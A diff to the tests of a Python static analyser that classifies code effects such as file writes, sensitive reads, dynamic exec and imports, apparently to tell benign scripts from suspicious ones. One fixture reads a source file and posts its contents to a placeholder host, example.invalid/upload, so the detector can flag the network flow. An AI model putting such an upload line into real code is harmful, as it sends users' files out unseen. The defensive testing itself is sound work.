@@ -88,15 +88,29 @@ def test_unittest_setup_method_is_runtime_not_install_phase():
     ]
 
 
-def test_file_write_content_is_not_treated_as_destination_path():
+def test_untyped_write_receiver_is_not_assumed_to_be_a_file():
     source = (
         "def render(handle):\n    handle.write('.. toctree::\\n   :maxdepth: 1\\n')\n"
     )
     result = PythonExtractor().analyze_source(source)
-    writes = [event for event in result.events if event.op == "FILE_WRITE"]
-    assert len(writes) == 1
-    assert writes[0].target.endswith(".write")
+    assert "FILE_WRITE" not in [event.op for event in result.events]
     assert "PERSISTENCE_WRITE" not in [event.op for event in result.events]
+
+
+def test_handle_assigned_from_open_remains_a_typed_file_sink():
+    source = "handle = open('artifact.py', 'w')\nhandle.write('generated source')\n"
+    result = PythonExtractor().analyze_source(source)
+    writes = [event for event in result.events if event.op == "FILE_WRITE"]
+    assert len(writes) == 2
+    assert {event.target for event in writes} == {"artifact.py"}
+
+
+def test_tokenizer_filename_is_not_a_sensitive_file_marker():
+    source = "from pathlib import Path\ntext = Path('tokenizer.py').read_text()\n"
+    result = PythonExtractor().analyze_source(source)
+    operations = [event.op for event in result.events]
+    assert "FILE_READ" in operations
+    assert "SENSITIVE_FILE_READ" not in operations
 
 
 def test_path_write_text_uses_receiver_as_destination():
@@ -129,11 +143,77 @@ def test_module_defined_compile_helper_is_not_treated_as_builtin_execution():
     assert "DYNAMIC_EXEC" not in [event.op for event in result.events]
 
 
-def test_explicit_builtins_compile_remains_dynamic_execution():
+def test_explicit_builtins_compile_is_compilation_not_execution():
     source = (
         "import builtins\n"
         "def run(value):\n"
         "    return builtins.compile(value, '<value>', 'exec')\n"
     )
     result = PythonExtractor().analyze_source(source)
-    assert "DYNAMIC_EXEC" in [event.op for event in result.events]
+    operations = [event.op for event in result.events]
+    assert "CODE_COMPILE" in operations
+    assert "DYNAMIC_EXEC" not in operations
+
+
+def test_literal_dunder_import_is_context_not_dynamic_loading():
+    source = (
+        "first = __import__('ast')\n"
+        "second = __import__('ast')\n"
+        "name = 'json'\n"
+        "third = __import__(name)\n"
+    )
+    result = PythonExtractor().analyze_source(source)
+    operations = [event.op for event in result.events]
+    assert operations.count("IMPORT") == 1
+    assert operations.count("DYNAMIC_IMPORT") == 1
+
+
+def test_effect_summary_recognizes_explicit_local_code_transformer():
+    source = (
+        "import ast\n"
+        "import sys\n\n"
+        "class Rewrite(ast.NodeTransformer):\n"
+        "    pass\n\n"
+        "def transform(source_path, output_path):\n"
+        "    with open(source_path, 'r') as source_file:\n"
+        "        tree = ast.parse(source_file.read())\n"
+        "    compile(tree, '<generated>', 'exec')\n"
+        "    with open(output_path, 'w') as output_file:\n"
+        "        output_file.write(ast.unparse(tree))\n\n"
+        "if __name__ == '__main__':\n"
+        "    transform(sys.argv[1], sys.argv[2])\n"
+    )
+    result = PythonExtractor().analyze_source(source, "transformer.py")
+    summary = result.effect_summary
+    assert summary.primary_purpose == "local-code-transformer"
+    assert summary.purpose_candidates[0].confidence == "high"
+    assert "local-file-to-local-artifact" in summary.flows
+    assert "code-generation" in summary.transformations
+    assert "EFFECT:ORIGIN:local_file" in summary.tokens
+    assert "EFFECT:DESTINATION:local_artifact" in summary.tokens
+    assert "PURPOSE:local_code_transformer" in summary.tokens
+
+
+def test_network_effect_blocks_local_transformer_purpose_candidate():
+    source = """
+import ast
+import requests
+import sys
+
+
+def transform(source_path, output_path):
+    with open(source_path, "r") as source_file:
+        text = source_file.read()
+    tree = ast.parse(text)
+    compile(tree, "<generated>", "exec")
+    with open(output_path, "w") as output_file:
+        output_file.write(ast.unparse(tree))
+    requests.post("https://example.invalid/upload", data=text)
+
+
+if __name__ == "__main__":
+    transform(sys.argv[1], sys.argv[2])
+"""
+    result = PythonExtractor().analyze_source(source, "transformer.py")
+
+    assert result.effect_summary.primary_purpose != "local-code-transformer"
